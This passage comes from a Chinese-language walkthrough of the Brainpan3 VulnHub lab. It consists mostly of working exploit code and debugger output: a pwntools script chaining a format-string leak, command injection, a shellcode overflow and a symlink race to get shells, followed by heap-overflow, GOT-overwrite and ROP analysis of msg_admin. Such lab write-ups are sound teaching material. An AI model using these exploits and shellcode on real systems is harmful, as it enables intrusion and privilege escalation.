<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc localhost 7075</span><br><span class="line">open: No such file or directory</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>不知道它来自什么服务，执行一个系统范围的字符串来尝试查找导致此问题的二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -executable &gt; exes</span><br><span class="line">$ <span class="keyword">for</span> f <span class="keyword">in</span> $(cat exes); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$f</span> &gt;&gt; output; strings <span class="variable">$f</span> | grep <span class="string">&quot;Incorrect key&quot;</span> &gt;&gt; output; <span class="keyword">done</span></span><br><span class="line">$ grep Incorrect output -B1</span><br><span class="line">/usr/<span class="built_in">local</span>/sbin/trixd</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>并确认</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ strings /usr/<span class="built_in">local</span>/sbin/trixd | grep Incorrect</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>将trixd加载到IDA中，看到二进制文件正在检查/mnt/usb/key.txt是否为符号链接，如果是，则立即退出。从这里，它同时打开/mnt/usb/key.txt和/home/puck/key.txt并检查它们是否相同。如果它们相同，将得到一个/bin/sh shell。否则，会看到错误的密钥消息。解决此问题的方法是连接到服务，删除/mnt/usb/key.txt，然后将/home/puck/key.txt符号链接到/mnt/usb/key.txt。如果时间安排正确，将在检查后进行符号链接，绕过它。不想将binjitsu放在VM本身上，可以在这部分使用标准库函数。再次，为了通过一个脚本来完成这项工作，将一个脚本写入磁盘并执行该脚本，以使的shell具有puck的功能。的新代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span><span class="string">&quot; echo &quot;</span></span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import telnetlib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = 7075</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">subprocess.check_output([<span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r = socket.socket()</span><br><span class="line">r.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = r</span><br><span class="line">t.interact()</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"><span class="string">&quot; &gt; win.py</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;python win.py&quot;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">log.success(<span class="string">&quot;Shell received: &#123;&#125;&quot;</span>.format(output))</span><br><span class="line">sleep(1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的代码之后，成功的拿到了puck用户的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 2796</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[+] Shell received: puck</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1001(puck) gid=1004(dev) groups=1001(puck)</span><br><span class="line">$ whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub208.jpg"></p>
<h2 id="步骤6"><a href="#步骤6" class="headerlink" title="步骤6"></a>步骤6</h2><p>现在，很吃力，需要完成认为是获得root shell的最后一步的工作。回到cronjob，需要分析msg_admin二进制文件。与加密二进制文件类似的方式将其从VM中提取。快速checksec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># checksec msg_admin</span></span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/msg_admin&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>Canaries，NX上。ASLR开启了吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>该抽出所有的止损了。从cronjob中，意识到二进制文件需要一个文件。静态分析二进制文件，看到文件需要包含名称行和由|分隔的消息。创建一个小的payload生成脚本来对此进行测试。</p>
<p>make-pwnmsg.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, <span class="string">&#x27;A&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;B&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;C&#x27;</span>*10))</span><br></pre></td></tr></table></figure>

<p>运行脚本之后，生成以下的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># ls</span></span><br><span class="line">bofh  bp3.py  brainpan.8  cryptor  make-pwnmsg.py  msg_admin  pwn.msg  report  shell  test.py  trixd</span><br><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># cat pwn.msg </span></span><br><span class="line">aaaa|AAAAAAAAAA</span><br><span class="line">bbbb|BBBBBBBBBB</span><br><span class="line">bbbb|CCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>在gdb中执行payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r 1 pwn.msg</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg</span><br><span class="line">[+] Recording 3 entries</span><br><span class="line">[+] Message from aaaa@kali</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0xf7e48f36 <span class="keyword">in</span> fputs () from /lib32/libc.so.6</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xa</span><br><span class="line"> EBX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> ECX  0x0</span><br><span class="line"> EDX  0xffffbebe ◂— 0x0</span><br><span class="line"> EDI  0xa</span><br><span class="line"> ESI  0x0</span><br><span class="line"> EBP  0xffffce68 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0</span><br><span class="line"> ESP  0xffffce40 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> EIP  0xf7e48f36 (fputs+38) ◂— mov    eax, dword ptr [esi]</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line"> ► 0xf7e48f36 &lt;fputs+38&gt;     mov    eax, dword ptr [esi]</span><br><span class="line">   0xf7e48f38 &lt;fputs+40&gt;     and    eax, 0x8000</span><br><span class="line">   0xf7e48f3d &lt;fputs+45&gt;     jne    fputs+100 &lt;0xf7e48f74&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e48f74 &lt;fputs+100&gt;    movsx  edx, byte ptr [esi + 0x46]</span><br><span class="line">   0xf7e48f78 &lt;fputs+104&gt;    <span class="built_in">test</span>   dl, dl</span><br><span class="line">   0xf7e48f7a &lt;fputs+106&gt;    jne    fputs+143 &lt;0xf7e48f9f&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e48f9f &lt;fputs+143&gt;    mov    ecx, dword ptr [ebp - 0x1c]</span><br><span class="line">   0xf7e48fa2 &lt;fputs+146&gt;    mov    ebx, dword ptr [esi + edx + 0x94]</span><br><span class="line">   0xf7e48fa9 &lt;fputs+153&gt;    lea    eax, [ecx + 0xf80]</span><br><span class="line">   0xf7e48faf &lt;fputs+159&gt;    lea    edx, [ecx + 0x1754]</span><br><span class="line">   0xf7e48fb5 &lt;fputs+165&gt;    mov    ecx, ebx</span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffce40 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">02:0008│      0xffffce48 —▸ 0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— ...</span><br><span class="line">03:000c│      0xffffce4c —▸ 0xf7fb5000 ◂— 0x1d6d6c</span><br><span class="line">04:0010│      0xffffce50 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0</span><br><span class="line">05:0014│      0xffffce54 —▸ 0xf7fe9450 ◂— pop    edx</span><br><span class="line">06:0018│      0xffffce58 ◂— 0x0</span><br><span class="line">07:001c│      0xffffce5c —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 f7e48f36 fputs+38</span><br><span class="line">   f 1  804892c record_data+271</span><br><span class="line">   f 2  8048a89 notify_admin+193</span><br><span class="line">   f 3  8048d4d main+664</span><br><span class="line">   f 4 f7dfc811 __libc_start_main+241</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x0)</span><br></pre></td></tr></table></figure>

<p>在静态分析中注意到了一些malloc。看看堆的布局。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">+0f30 0x804d908  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0f70 0x804d948  00 00 00 00  11 00 00 00  01 00 00 00  60 d9 04 08  │....│....│....│`...│</span><br><span class="line">+0f80 0x804d958  70 d9 04 08  11 00 00 00  61 61 61 61  00 00 00 00  │p...│....│aaaa│....│</span><br><span class="line">+0f90 0x804d968  00 00 00 00  d1 00 00 00  41 41 41 41  41 41 41 41  │....│....│AAAA│AAAA│</span><br><span class="line">+0fa0 0x804d978  41 41 00 00  00 00 00 00                            │AA..│....│    │    │</span><br><span class="line">pwndbg&gt; </span><br><span class="line">+0f90 0x804d980  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+1000 0x804d9f0  00 00 00 00  00 00 00 00                            │....│....│    │    │</span><br><span class="line">pwndbg&gt; </span><br><span class="line">+0fc0 0x804d9f8  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+1000 0x804da38  00 00 00 00  11 00 00 00  01 00 00 00  50 da 04 08  │....│....│....│P...│</span><br><span class="line">+1010 0x804da48  60 da 04 08  11 00 00 00  62 62 62 62  00 00 00 00  │`...│....│bbbb│....│</span><br><span class="line">+1020 0x804da58  00 00 00 00  d1 00 00 00  42 42 42 42  42 42 42 42  │....│....│BBBB│BBBB│</span><br><span class="line">+1030 0x804da68  42 42 00 00  00 00 00 00                            │BB..│....│    │    │</span><br></pre></td></tr></table></figure>

<p>似乎的每条消息都在堆中背对背。看起来在消息之后还存在两个指针（请参见地址0x804d958和0x804da48）。消息和最后一个指针之间有多少可用空间。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x804da48 - 0x804d970</span><br><span class="line">216</span><br></pre></td></tr></table></figure>

<p>怀疑可以用A溢出两个指针，抛出数据以查看是否可以控制这些指针。</p>
<p>make-pwnmsg.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, cyclic(216)))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;B&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;C&#x27;</span>*10))</span><br></pre></td></tr></table></figure>

<p>在gdb中再次执行相同的payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r 1 pwn.msg </span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg</span><br><span class="line">[+] Recording 3 entries</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0xf7e70bb2 <span class="keyword">in</span> ?? () from /lib32/libc.so.6</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x62626262 (<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"> EBX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> ECX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> EDX  0x63616164 (<span class="string">&#x27;daac&#x27;</span>)</span><br><span class="line"> EDI  0xf7fb5000 ◂— 0x1d6d6c</span><br><span class="line"> ESI  0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— 0x0</span><br><span class="line"> EBP  0xffffd2e8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line"> EIP  0xf7e70bb2 ◂— mov    dword ptr [edx], eax</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line"> ► 0xf7e70bb2    mov    dword ptr [edx], eax</span><br><span class="line">   0xf7e70bb4    mov    al, byte ptr [ecx + 4]</span><br><span class="line">   0xf7e70bb7    mov    byte ptr [edx + 4], al</span><br><span class="line">   0xf7e70bba    mov    eax, edx</span><br><span class="line">   0xf7e70bbc    ret    </span><br><span class="line"> </span><br><span class="line">   0xf7e70bbd    lea    esi, [esi]</span><br><span class="line">   0xf7e70bc0    mov    eax, dword ptr [ecx]</span><br><span class="line">   0xf7e70bc2    mov    dword ptr [edx], eax</span><br><span class="line">   0xf7e70bc4    mov    ax, word ptr [ecx + 4]</span><br><span class="line">   0xf7e70bc8    mov    word ptr [edx + 4], ax</span><br><span class="line">   0xf7e70bcc    mov    eax, edx</span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line">01:0004│      0xffffd0c0 ◂— <span class="string">&#x27;daac&#x27;</span></span><br><span class="line">02:0008│      0xffffd0c4 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">03:000c│      0xffffd0c8 —▸ 0x804c1a0 ◂— 0xfbad2488</span><br><span class="line">04:0010│      0xffffd0cc ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">05:0014│      0xffffd0d0 ◂— <span class="string">&#x27;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">06:0018│      0xffffd0d4 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">07:001c│      0xffffd0d8 ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 f7e70bb2</span><br><span class="line">   f 1  8048cd0 main+539</span><br><span class="line">   f 2 f7dfc811 __libc_start_main+241</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x63616164)</span><br></pre></td></tr></table></figure>

<p>一定喜欢看到SIGSEGV，是吗？崩溃指令是mov [edx]，eax。看来正在用bbbb（eax-第二条消息）覆盖地址daac（edx-来自循环函数）中的数据。这实际上是“在哪里写”条件，在这里可以在任何地方写入4个字节的内容。查看0x8048cd0（在第1帧处的回溯），看到处于strcpy状态。在此处设置断点并重新启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn&gt; bp 0x8048ccb</span><br><span class="line"></span><br><span class="line">[---------------------------------------CODE----------------------------------------]</span><br><span class="line">=&gt; 0x8048ccb &lt;main+534&gt;    call   0x8048630 &lt;strcpy@plt&gt;</span><br><span class="line">    dest:      0x63616164 (<span class="string">&#x27;daac&#x27;</span>)</span><br><span class="line">    src:       0x804c170 &lt;-- <span class="string">&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在崩溃点，堆栈处于以下状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[---------------------------------------STACK---------------------------------------]</span><br><span class="line">00:0000| esp  0xffffc83c --&gt; 0x8048cd0 (main+539) &lt;-- mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line">01:0004|      0xffffc840 &lt;-- 0x63616164</span><br><span class="line">02:0008|      0xffffc844 --&gt; 0x804c170 &lt;-- <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">03:000c|      0xffffc848 --&gt; 0x804c008 &lt;-- 0xfbad2488</span><br><span class="line">04:0010|      0xffffc84c &lt;-- <span class="string">&#x27;aaaabaaacaaadaa...&#x27;</span></span><br><span class="line">05:0014|      0xffffc850 &lt;-- <span class="string">&#x27;baaacaaadaaaeaa...&#x27;</span></span><br><span class="line">06:0018|      0xffffc854 &lt;-- <span class="string">&#x27;caaadaaaeaaafaa...&#x27;</span></span><br><span class="line">07:001c|      0xffffc858 &lt;-- <span class="string">&#x27;daaaeaaafaaagaa...&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在堆栈地址看到了受控缓冲区0xffffc84c,为了将ESP移至缓冲区，需要执行堆栈枢纽操作，以便启动ROP序列。<br>将bbbb设置为从binjitsu（rop.search（move = 20）.address）移动20的堆栈地址，并将daac的偏移量设置为strtok GOT条目。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">pivot = rop.search(move=20).address</span><br><span class="line">strtok = elf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Pivot: &#123;&#125;&quot;</span>.format(hex(pivot)))</span><br><span class="line">log.info(<span class="string">&quot;Strtok: &#123;&#125;&quot;</span>.format(hex(strtok)))</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    sc = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;daac&#x27;</span>) + p32(strtok)</span><br><span class="line">    sc += <span class="string">&#x27;B&#x27;</span> * (216 - len(sc))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, sc))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), <span class="string">&#x27;B&#x27;</span>*12))</span><br></pre></td></tr></table></figure>

<p>太棒了，所以现在有了堆栈控制和EIP控制。;-)使用ROPGadget查看相关的ROP小工具。请注意，一定要增加–depth，以便可以看到更多小工具。在这种情况下，这一点很重要。没有它，将无法找到清晰的eax小工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --depth 30 --binary msg_admin</span><br></pre></td></tr></table></figure>

<p>列表中的两个小工具非常有趣。下面的小工具将允许使用取消引用的指针来增加eax。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret</span><br></pre></td></tr></table></figure>

<p>下一个小工具将提供清除eax的方法。请注意，从默认的ROPgadget设置–depth 10中看不到此小工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08048790 : mov eax, 0x804b074 ; sub eax, 0x804b074 ; sar eax, 2 ; mov edx, eax ; shr edx, 0x1f ; add eax, edx ; sar eax, 1 ; jne 0x80487c1 ; ret</span><br></pre></td></tr></table></figure>

<p>攻击计划如下（剧透警报，几乎与每个CTF ASLR旁路相同）：</p>
<ul>
<li>引用GOT中的条目。</li>
<li>计算给定条目和系统之间的差异。</li>
<li>将此差异添加到取消引用的值中。</li>
<li>调用system（’/tmp/foo’），其中/tmp/foo包含我们的命令。</li>
</ul>
<p>因为要减少添加偏移量指令的数量，所以尝试在msg_admin中找到哪个GOT条目最接近其libc中的系统。</p>
<p>find-good-addr.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> elf.symbols:</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> libc.symbols[symbol] &lt; libc.symbols[<span class="string">&#x27;system&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span> symbol, hex(libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[symbol])</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

